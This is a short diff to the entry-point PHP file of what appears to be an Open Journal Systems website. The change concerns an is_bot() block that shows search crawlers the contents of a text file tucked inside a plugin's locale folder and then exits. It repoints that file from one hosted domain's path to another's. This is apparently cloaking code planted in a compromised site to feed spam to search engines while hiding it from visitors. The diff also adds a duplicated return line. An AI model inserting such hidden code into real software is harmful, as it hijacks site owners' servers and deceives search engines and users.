@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/u514303699/domains/ijnpam.com/public_html/controllers/grid/settings/sections/form/index.txt');
+    $message = file_get_contents('/home/u514303699/domains/ijhsbm.com/public_html/plugins/pubIds/urn/locale/zh_Hant/index.txt');
     echo $message;
 exit;
 }
@@ -53,5 +53,7 @@ chdir(BASE_SYS_DIR);
 // System-wide functions
 require_once './lib/pkp/includes/functions.php';
 
+// Initialize the application environment
+return new \APP\core\Application();
 // Initialize the application environment
 return new \APP\core\Application();
